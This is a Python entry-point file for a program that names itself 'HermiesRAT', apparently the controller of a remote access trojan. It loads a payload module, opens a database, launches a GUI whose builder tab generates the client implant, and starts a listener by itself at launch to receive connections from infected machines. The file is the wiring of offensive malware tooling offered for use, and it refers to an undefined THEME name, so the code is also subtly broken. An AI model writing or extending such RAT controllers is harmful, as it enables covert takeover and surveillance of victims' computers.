# lang: Python 3, file: main.py, target: all platforms
# entrypoint — wires everything together and launches the GUI
import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "src"))
import config
import database
import payload_center
from gui import HermiesRATGUI


def main():
    config.load_config()
    payload_center.pc_load()

    app = HermiesRATGUI()

    db_path = config._config.get("db_path")
    if db_path:
        database.db_init(db_path)
        if hasattr(app, "_set_db_status") and database.db_connected():
            app._set_db_status.configure(
                text=f"DB connected: {db_path}", fg=THEME["GREEN"])

    app.log("HermiesRAT starting — use BUILDER tab to generate client")
    app.log(f"default listener auto-starts on port {config.PORT}")
    app._restart_listener(config.PORT)
    app.mainloop()
    database.db_close()


if __name__ == "__main__":
    main()
